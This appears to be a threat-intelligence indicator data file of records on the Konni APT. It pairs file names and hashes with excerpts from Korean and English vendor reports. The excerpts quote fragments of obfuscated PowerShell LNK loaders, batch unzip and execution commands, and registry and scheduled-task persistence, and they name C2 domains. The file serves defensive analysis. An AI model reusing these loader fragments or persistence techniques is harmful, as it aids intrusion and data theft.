캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:dec60ed6fe2af9c800936bd634f7c75b4ca89fd69bf3834e176170d5b2f649d6,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:860119ec3fd7c3a1cdc1c93838c2021189aacddadb7ddfc4d82a4bdc58eb2928,observation--sha256:9472a1c359a47c791aceab9da85174a9e54a2f68f6eaa542fc9fa6476e890586,file-name,resolvedns.bat,resolvedns.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:8c7aa1d8c8e9ad054c23fd9ebbca0c368ad5a4902b0d1f176fd19547315db75d,observation--sha256:1bee3bcd1905b8e884e4dc851ed8d3d29cab9bbd5674c5a277eb0a2729ee6ee0,file-name,rp-operation-oceansalt.pdf,rp-operation-oceansalt.pdf,candidate,2017-08-01T00:00:00Z,month,known,same-record,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Reference List https://asec.ahnlab.com/ko/1251/ https://blog.alyac.co.kr/2061 https://blog.alyac.co.kr/3014 https://blog.alyac.co.kr/3390 https://blog.alyac.co.kr/3550 https://blogs.blackberry.com/en/2017/08/threat-spotlight-konni-stealthy-remote-access-trojan https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html https://download.ahnlab.com/kr/site/library/Analysis_Report_Operation_Moneyholic.pdf https://e.cyberint.com/hubfs/Cyberint_Konni%20Malware%202019%20Campaig,
1.0.0,actor--konni,artifact--sha256:ae5019ddb7f3021a617c7426267ae0559011b56735428d8e7475170d38dd4663,observation--sha256:f94d79a1ca7f34888afc156759fdf50489788e0e827f6da716b04f21f7d82012,file-name,rshell.exe,rshell.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /kfor /f ""tokens=*"" %ain('dirC:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe/s/b/od') docall %a-windowstylehidden""$SvvZPNyDG=Get-Location;if($SvvZPNyDG-Match'System32' -or $SvvZPNyDG-Match'ProgramFiles') {$SvvZPNyDG='%temp%';};$yeWaKMJy=Get-ChildItem-Path$SvvZPNyDG-Recurse*.lnk| where-object{$_.length-eq0x012F3333} | Select-Object -ExpandPropertyFullName;$SvvZPNyDG=Split-Path$yeWaKMJy;$vwgC8wlBQ=New-Object System.IO.FileStream($yeWaKMJy,[System.IO.FileMode]::Open",
1.0.0,actor--konni,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:54748507d9c49127439936821ac1f11d9b94da8811b790a5931ae85b33812b97,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:e25a41785b87ffb8f3b58890c21da53f0b2b23b45ee5c3e2ab08a4be1730acf3,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:8611b88606e16f3f0c6523b60274c710b4672e3d334b8b7c4b38f63e6cba08e2,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:bbab596f053d8b26e318a5880e01177886a1d4413457fbc19c9a8d896a772458,observation--sha256:7bf2fed70af03543547d198b4d950983796b1406f5672383ada4266529906455,file-name,securityMail.html.lnk,securityMail.html.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■카카오뱅크보안메일위장 ○GSC 는북한대학원대학교사칭건을발견한같은날, 마치카카오뱅크보안메일처럼위장한또다른위협유형을식별했습니다. 대체로LNK기반공격은압축파일내부에숨겨, 전자우편으로전달하는스피어피싱전략을구사합니다. ○ 추가사례는'securityMail.zip' 압축이름을사용했으며, 이전사례처럼압축포맷내부에 2중 확장자를 지닌 'securityMail.html.lnk' 바로가기형 악성 코드가 내장돼있습니다. 앞서 기술한 여러 사례들이 XLSX, PDF, HWP 등 주로 문서 파일처럼위장했다면, 본 건은 HTML 웹 페이지 파일로 위장한 것이 차이점입니다. 그리고'update_cmd.zip' 파일을생성하는데, 기존과동일한파일이사용됐습니다. [그림5-3] 카카오뱅크보안메일비밀번호입력위장화면 ○ 2022년 11월 경 발견된 유사한위협사례중, 악성DLL 파일을설치하는형태가발견된바있습니다. 당시보고된유사변종공격사례도마치카카오뱅크의보안메일화면에비밀번호를",
1.0.0,actor--konni,artifact--sha256:2ebd55f517144407879513cf0a7b845b5a8d50ba5c7bd6f977a4d62fd017568e,observation--sha256:2a8e9adff7de06635b0c8a1441b63ed995fd9f864605d9a5993acdebd248f2f6,file-name,securityMail.zip,securityMail.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■카카오뱅크보안메일위장 ○GSC 는북한대학원대학교사칭건을발견한같은날, 마치카카오뱅크보안메일처럼위장한또다른위협유형을식별했습니다. 대체로LNK기반공격은압축파일내부에숨겨, 전자우편으로전달하는스피어피싱전략을구사합니다. ○ 추가사례는'securityMail.zip' 압축이름을사용했으며, 이전사례처럼압축포맷내부에 2중 확장자를 지닌 'securityMail.html.lnk' 바로가기형 악성 코드가 내장돼있습니다. 앞서 기술한 여러 사례들이 XLSX, PDF, HWP 등 주로 문서 파일처럼위장했다면, 본 건은 HTML 웹 페이지 파일로 위장한 것이 차이점입니다. 그리고'update_cmd.zip' 파일을생성하는데, 기존과동일한파일이사용됐습니다. [그림5-3] 카카오뱅크보안메일비밀번호입력위장화면 ○ 2022년 11월 경 발견된 유사한위협사례중, 악성DLL 파일을설치하는형태가발견된바있습니다. 당시보고된유사변종공격사례도마치카카오뱅크의보안메일화면에비밀번호를",
1.0.0,actor--konni,artifact--sha256:ffa5fca7d35b83eecc0a0b4aa039c3d6235aa1850f4fa410c178784e53b548a9,observation--sha256:f5c6b909d63eaa9e1150b9332a31e445112e3ee579dac0585159a54fdc81c191,file-name,securityMail_1031.html.lnk,securityMail_1031.html.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:0c37253ae1adb0e7613ca0d4fed02c3b658c7072369977e5ad626eed65ffa7b5,observation--sha256:59d68bf51c8c39503da386a13a7c5da244a518fa31403a124993edc27d9a0e87,file-name,securityMail_1101.html.lnk,securityMail_1101.html.lnk,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:38828e5660cc7aa9fe35b5fb0fb20e45a8903ef3e67406c7e4694e3379b91c03,observation--sha256:24106e653fc468487f893cd98f1acfb95b6250c2e3fa690fa2c0a949d1a2761d,file-name,star-send.php,star-send.php,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Star Star is another PHP-based, email-sending tool that TA406 uses. Proofpoint refers to this tool as Star based on the “star 3.0” HTTP title observed in some versions of the tool. The tool has also been observed with a star-send.php file name. Much like the PHPMailer tool, Star ’s purpose is to provide an easy-to-use web interface for an operator to send phishing emails. PEAR Mail 1.2.0b4 and Mail_Queue are used to assist with sending emails. At least one other DPRK actor that Proofpoint tracks",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:253a3b47a16a4a4e5622e87a17560a250c0ef8b89aa9bd6bdf6d0c290aff0c32,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 14 ○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을 ASCII 코드로 변환하면 상세 명령을 확인할 수 있습니다. $LsUvVpNHlCfpw = Get - Location; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - eq 0x1466956A } | Select - Object - ExpandProperty FullName; if ($SEvhgMDD.length - eq 0) { $LsUvVpNHlCfpw = $env: Temp; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - e,
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:94a7fa6bcca8684c4dc6169c98f472ef46db9e9588b8ee216aa3076d46b49d27,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 15 ○ 내부에 선언된 인자값은 LNK 전체 길이 ‘0x1466956A’ (342,267,242 바이트) 값을 확인합니다. 그리고 ‘0x00003C4A’ 오프셋 부터 ‘0x00006C00’ 값을 읽어 유니코드 이스케이프 포맷 6에 선언한 ‘소명자료 목록(국세징수법 시행규칙).hwp’ 파일로 생성 후 실행합니다. 그리고 기존 LNK 파일은 삭제됩니다. Unicode Escape Unicode Unescape \uC18C\uBA85\uC790\uB8CC \u0020\uBAA9\uB85D\u0028 \uAD6D\uC138\uC9D5\uC218 \uBC95\u0020\uC2DC\uD589 \uADDC\uCE59\u0029\u002E \u0068\u0077\u0070 소명자료 목록(국세징수법 시행규칙).hwp [표 03] 유니코드 문자 변환 화면 ○ 다음으로 ‘0x0000A84A’ 오프셋 부터 ‘0x0",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:0b7eef6a34297571e8b2919b5b154fd3f6ddeeadffde5d03ad37475d59d94754,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:db182ee120c0bf5c04e2013af62865b8a22568f07d67861c06360ad23795ed40,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:fec9304108142232352e6668f5754b0226253580508d8797527875c668887132,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 22 b. ‘start.vbs’ ○ 본 파일은 ZIP 파일이 풀린 후 가장 먼저 실행되는 파일로, Visual Basic Script 명령을 수행하게 됩니다. 파일명 start.vbs MD5 19ecb637cb3ba2660994eb87990c82d7 SHA1 cd81d310dd6b6029959e3c57dc11b751ab8220f4 SHA256 3c79f5bc1608f7582253cf201824d75d7c5cfbaa15334797 9e3ca701ceaefa20 [표 06] start.vbs 파일 HASH 정보 화면 ○ 파일 내부에는 다음과 같은 명령어를 가지고 있으며, 압축이 풀렸던 동일 경로의 ‘73888454.bat’ 배치 파일을 실행(Run)하는 명령을 수행하고 종료합니다. [그림 13] VBS 스크립트 내부 코드 화면 [그림 14] start.vbs 의 스크립트 코드를 실행시키기 위한 w",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:c9b35069d80c15b33d3868e19e39fc2f01dc82e4a75fcc4060409152459832eb,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:857f99cd4a11ef57a92dfe2728830696ef8fd094061f8e00313946360ee6c6a5,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 26 ○ 영국 정보 기관인 GCHQ 에서 만든 데이터 분석 및 변환을 위한 오픈 소스 웹 프로그램인 CyberChef 기능을 통해 [Base64+RC4] 데이터를 간편하게 복호화할 수 있습니다.8 [그림 16] CyberChef 디코딩 화면 ○ 다음으로 57 초 대기시간을 유지한 후 ‘pakistan.txt’ 파일 비교루틴을 수행하게 됩니다. [그림 17] 73888454.bat 실행에 의해 자동실행 레지스트리 등록된 start.vbs 8 CyberChef 웹 사이트,
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:a6e99a4e77a3c07f70f68ad28ea5b8e093d0aa75651694a0ae6718d570a683e7,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:2e503e59e8312427b07eb8994f5d35a73e8b1cbc0c16af05616991d827de16ca,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 6 e. EDR 솔루션을 통한 가시성 확보 (Visibility) ○ 본 사례의 경우 악성 LNK 바로가기 파일 구조 내부에 ‘자금출처명세서(부가가치세법 시행규칙).hwp’ 정상 문서와 ‘04769.zip’ 파일이 임베디드 된 형태로 보관되어 있습니다. 정상 문서 파일은 LNK 파일이 실행된 경로에 만들어지고, 압축 파일은 ‘Public’ 공용 폴더 경로에 생성됩니다. 압축은 공용 경로 하위의 ‘Documents’ 공용 문서 경로에 풀리고, ‘start.vbs’ 파일이 실행되는 과정을 거치게 됩니다. ○ ‘04769.zip’ 파일 내부에는 총 5 개의 BAT 파일이 존재하고, ‘start.vbs’ 파일에 의해 맨 처음 호출되며, 배치 파일 내부명령에 따라 순차적으로 악성 행위를 수행하게 됩니다. 물론 변형에 따라 복잡도는 조금씩 차이가 발생합니다. Genian EDR 3 제품은 이처럼 복잡성을",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:70ae931f008f39b341176f81c59650179057f1635cf833993ed51787fe4387f4,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 유사도분석(SimilarityAnalysis)5.1. Konni APT캠페인별코드비교■'국세청사칭' VS'북한인권단체사칭' ○ 각 LNK 파일의 내부 명령을 비교해 보면다음과같습니다. 국세청사칭의경우는2023년 7월 31일 지니언스 블로그에 등록된 '국세청 우편물 발송 알림 사칭 공격(Konni APT Campaign)' 위협분석보고서를통해자세한내용을확인할수있습니다.5 ○ 국세청 사칭 LNK 명령어는 16진수 값으로 포함돼 있어, 이 부분은 디코딩 후에비교하였습니다. 국세청사칭LNK명령부분 북한인권단체사칭LNK명령부분 New-Object byte[]0x00014405;$znUKtljyzBrPLDZ.Read($SppylSfzYpca, 0,0x00014405);$znUKtljyzBrPLDZ.Close();Remove-Item-Path$SEvhgMDD-Force;$wxJAARinisLXUr=$env:public+'\' +'04769.zi",
1.0.0,actor--konni,artifact--sha256:09574f14334f6b8b12e811edd91604f30d50a53b34e51c6109f2bfddca723096,observation--sha256:b2e0a8a169d1ae0d9aa1752e3102331830b87c9d4847634743a1185e7c53f96b,file-name,start.vbs,start.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:5a45a78e841e588f919d75a37ba529bad14244ed9a025bb3ccdab1dfac4d1c52,observation--sha256:9863e89200b7861cfb2ae18b0f8fcbcf7bdb410a1059000d9493d41e23f668be,file-name,statistic.php,statistic.php,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"@header( ""Refresh: 0; url = statistic.php"" );",
1.0.0,actor--konni,artifact--sha256:5a45a78e841e588f919d75a37ba529bad14244ed9a025bb3ccdab1dfac4d1c52,observation--sha256:0f4ebd525ecbd98d1afe8bb176405cf86dbab04a0389666547b086e3c52e6c80,file-name,statistic.php,statistic.php,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"@header( ""Refresh: 0; url = statistic.php"" );",
